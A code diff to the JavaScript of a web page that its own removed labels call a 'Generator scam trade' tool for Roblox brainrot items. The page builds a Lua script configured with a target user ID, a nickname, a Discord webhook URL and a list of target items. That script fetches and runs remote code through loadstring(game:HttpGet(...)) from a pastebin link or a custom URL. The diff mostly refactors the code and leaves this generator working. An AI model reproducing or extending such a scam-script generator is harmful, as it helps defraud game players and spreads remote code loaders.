@@ -50,211 +50,99 @@ const allBrainrots = [
     "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block"
 ];
 
-// Тексты для двух языков
-const langTexts = {
-    en: {
-        titleSub: "Generator scam trade",
-        labelNick: "👤 Roblox Nickname",
-        labelId: "🆔 Roblox User ID",
-        labelWebhook: "🔗 Discord Webhook URL",
-        labelBrainrots: "🎯 Target Brainrots",
-        selectAll: "✅ Select All",
-        deselectAll: "❌ Clear All",
-        searchPlaceholder: "🔍 Search...",
-        labelScript: "📦 Additional Script",
-        script22s: "22s Hub",
-        scriptCustom: "Custom",
-        generate: "🚀 GENERATE",
-        copy: "📋 COPY",
-        outputTitle: "📜 Generated Script:"
-    },
-    ru: {
-        titleSub: "Generator scam trade",
-        labelNick: "👤 Roblox Никнейм",
-        labelId: "🆔 Roblox User ID",
-        labelWebhook: "🔗 Discord Webhook URL",
-        labelBrainrots: "🎯 Таргет брейнроты",
-        selectAll: "✅ Выбрать всех",
-        deselectAll: "❌ Убрать всех",
-        searchPlaceholder: "🔍 Поиск...",
-        labelScript: "📦 Дополнительный скрипт",
-        script22s: "22s Hub",
-        scriptCustom: "Свой",
-        generate: "🚀 СГЕНЕРИРОВАТЬ",
-        copy: "📋 КОПИРОВАТЬ",
-        outputTitle: "📜 Сгенерированный скрипт:"
-    }
-};
-
-let currentLang = 'ru';
-
-// Функция обновления текста
-function updateLanguage() {
-    const texts = langTexts[currentLang];
-    document.getElementById('subtitle').textContent = texts.titleSub;
-    document.getElementById('labelNick').textContent = texts.labelNick;
-    document.getElementById('labelId').textContent = texts.labelId;
-    document.getElementById('labelWebhook').textContent = texts.labelWebhook;
-    document.getElementById('labelBrainrots').textContent = texts.labelBrainrots;
-    document.getElementById('selectAllBtn').textContent = texts.selectAll;
-    document.getElementById('deselectAllBtn').textContent = texts.deselectAll;
-    document.getElementById('searchBrainrots').placeholder = texts.searchPlaceholder;
-    document.getElementById('labelScript').textContent = texts.labelScript;
-    
-    const radioLabels = document.querySelectorAll('.radio-label');
-    if (radioLabels.length >= 2) {
-        radioLabels[0].innerHTML = `<input type="radio" name="scriptType" value="22s" checked> ${texts.script22s}`;
-        radioLabels[1].innerHTML = `<input type="radio" name="scriptType" value="custom"> ${texts.scriptCustom}`;
-    }
-    
-    document.getElementById('generateBtn').textContent = texts.generate;
-    const copyBtn = document.getElementById('copyBtn');
-    if (copyBtn.style.display !== 'none') {
-        copyBtn.textContent = texts.copy;
-    }
-    document.getElementById('outputTitle').textContent = texts.outputTitle;
-}
-
-// Заполнение списка чекбоксами
 function populateBrainrotsList() {
-    let container = document.getElementById('brainrotsList');
+    const container = document.getElementById('brainrotsList');
     container.innerHTML = '';
     allBrainrots.forEach(br => {
-        let label = document.createElement('label');
+        const label = document.createElement('label');
         label.className = 'checkbox-item';
-        let checkbox = document.createElement('input');
-        checkbox.type = 'checkbox';
-        checkbox.value = br;
-        let span = document.createElement('span');
+        const cb = document.createElement('input');
+        cb.type = 'checkbox';
+        cb.value = br;
+        const span = document.createElement('span');
         span.textContent = br;
-        label.appendChild(checkbox);
+        label.appendChild(cb);
         label.appendChild(span);
         container.appendChild(label);
     });
 }
 
-// Поиск по списку
-document.getElementById('searchBrainrots').addEventListener('input', function(e) {
-    let search = e.target.value.toLowerCase();
-    let items = document.querySelectorAll('.checkbox-item');
-    items.forEach(item => {
-        let text = item.querySelector('span').textContent.toLowerCase();
-        if (text.includes(search)) {
-            item.style.display = 'flex';
-        } else {
-            item.style.display = 'none';
-        }
+document.getElementById('searchBrainrots').addEventListener('input', (e) => {
+    const term = e.target.value.toLowerCase();
+    document.querySelectorAll('.checkbox-item').forEach(item => {
+        const text = item.querySelector('span').textContent.toLowerCase();
+        item.style.display = text.includes(term) ? 'flex' : 'none';
     });
 });
 
-// Выбрать всех
-document.getElementById('selectAllBtn').addEventListener('click', function() {
+document.getElementById('selectAllBtn').onclick = () => {
     document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = true);
-});
+};
 
-// Убрать всех
-document.getElementById('deselectAllBtn').addEventListener('click', function() {
+document.getElementById('deselectAllBtn').onclick = () => {
     document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = false);
-});
+};
 
-// Переключение кастомного скрипта
 document.querySelectorAll('input[name="scriptType"]').forEach(radio => {
-    radio.addEventListener('change', function() {
-        let customTextarea = document.getElementById('customScript');
-        if (this.value === 'custom') {
-            customTextarea.style.display = 'block';
-        } else {
-            customTextarea.style.display = 'none';
-        }
+    radio.addEventListener('change', () => {
+        const customArea = document.getElementById('customScript');
+        customArea.style.display = radio.value === 'custom' ? 'block' : 'none';
     });
 });
 
-// Генерация скрипта
-document.getElementById('generateBtn').addEventListener('click', function() {
-    let robloxNick = document.getElementById('robloxNick').value.trim() || "sdfgrijjkdsfg";
-    let robloxId = document.getElementById('robloxId').value.trim() || "8986116710";
-    let webhookUrl = document.getElementById('webhookUrl').value.trim();
-    let scriptType = document.querySelector('input[name="scriptType"]:checked').value;
-    let customScript = document.getElementById('customScript').value;
-    
-    let selectedBrainrots = [];
-    document.querySelectorAll('#brainrotsList input:checked').forEach(cb => {
-        selectedBrainrots.push(cb.value);
-    });
-    
-    if (selectedBrainrots.length === 0) {
-        alert(currentLang === 'ru' ? 'Выберите хотя бы один брейнрот' : 'Select at least one brainrot');
+document.getElementById('generateBtn').addEventListener('click', () => {
+    const nick = document.getElementById('robloxNick').value.trim() || "sdfgrijjkdsfg";
+    const userId = document.getElementById('robloxId').value.trim() || "8986116710";
+    const webhook = document.getElementById('webhookUrl').value.trim();
+    const scriptType = document.querySelector('input[name="scriptType"]:checked').value;
+    const customScript = document.getElementById('customScript').value;
+
+    const selected = [];
+    document.querySelectorAll('#brainrotsList input:checked').forEach(cb => selected.push(cb.value));
+
+    if (selected.length === 0) {
+        alert('Select at least one brainrot');
         return;
     }
-    
-    if (!webhookUrl) {
-        alert(currentLang === 'ru' ? 'Введите Webhook URL' : 'Enter Webhook URL');
+    if (!webhook) {
+        alert('Enter Webhook URL');
         return;
     }
-    
-    let loadScript = scriptType === "22s" 
+
+    const loadLine = scriptType === '22s' 
         ? 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()'
         : customScript;
-    
-    let brainrotListStr = "{\n    " + selectedBrainrots.map(br => `"${br}"`).join(",\n    ") + "\n}";
-    
-    let script = `-- ========== КОНФИГ ==========
+
+    const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";
+
+    const finalScript = `-- ========== CONFIG ==========
 local CONFIG = {
-    TARGET_USER_ID = "${robloxId}",
-    TARGET_NAME = "${robloxNick}",
-    WEBHOOK_URL = "${webhookUrl}",
+    TARGET_USER_ID = "${userId}",
+    TARGET_NAME = "${nick}",
+    WEBHOOK_URL = "${webhook}",
     TARGET_BRAINROTS = ${brainrotListStr}
 }
--- ========== КОНЕЦ КОНФИГА ==========
+-- ========== END CONFIG ==========
 
--- ===== ЗАГРУЗКА ОСНОВНОГО СКРИПТА =====
-loadstring(game:HttpGet("ССЫЛКА_НА_СКРИПТ"))()
+-- Load main script
+loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()
 
-print("Script loaded | Таргет ID: " .. CONFIG.TARGET_USER_ID .. " | Brainrots: " .. #CONFIG.TARGET_BRAINROTS)`;
+print("Loaded | ID: " .. CONFIG.TARGET_USER_ID .. " | Brainrots: " .. #CONFIG.TARGET_BRAINROTS)`;
 
-    document.getElementById('scriptOutput').textContent = script;
+    document.getElementById('scriptOutput').textContent = finalScript;
     document.getElementById('output').style.display = 'block';
     const copyBtn = document.getElementById('copyBtn');
-    copyBtn.style.display = 'inline-block';
-    copyBtn.textContent = langTexts[currentLang].copy;
+    copyBtn.style.display = 'inline-flex';
 });
 
-// Копирование
-document.getElementById('copyBtn').addEventListener('click', function() {
-    let script = document.getElementById('scriptOutput').textContent;
-    navigator.clipboard.writeText(script).then(() => {
-        alert(currentLang === 'ru' ? 'Скопировано!' : 'Copied!');
-    }).catch(() => {
-        alert(currentLang === 'ru' ? 'Не удалось скопировать' : 'Failed to copy');
-    });
+document.getElementById('copyBtn').addEventListener('click', () => {
+    const text = document.getElementById('scriptOutput').textContent;
+    navigator.clipboard.writeText(text);
+    alert('Copied to clipboard!');
 });
 
-// Дискорд кнопка
-document.getElementById('discordBtn').addEventListener('click', function() {
+document.getElementById('discordBtn').addEventListener('click', () => {
     window.open('https://discord.gg/9A6x27c9k6', '_blank');
 });
 
-// Языковые кнопки
-document.getElementById('langEn').addEventListener('click', function() {
-    currentLang = 'en';
-    updateLanguage();
-});
-
-document.getElementById('langRu').addEventListener('click', function() {
-    currentLang = 'ru';
-    updateLanguage();
-});
-
-// Анимация для полей ввода
-document.querySelectorAll('input, textarea').forEach(el => {
-    el.addEventListener('focus', function() {
-        this.parentElement.querySelector('label')?.style.setProperty('color', '#5a9eff');
-    });
-    el.addEventListener('blur', function() {
-        this.parentElement.querySelector('label')?.style.setProperty('color', '#b8d4ff');
-    });
-});
-
-// Инициализация
 populateBrainrotsList();
-updateLanguage();
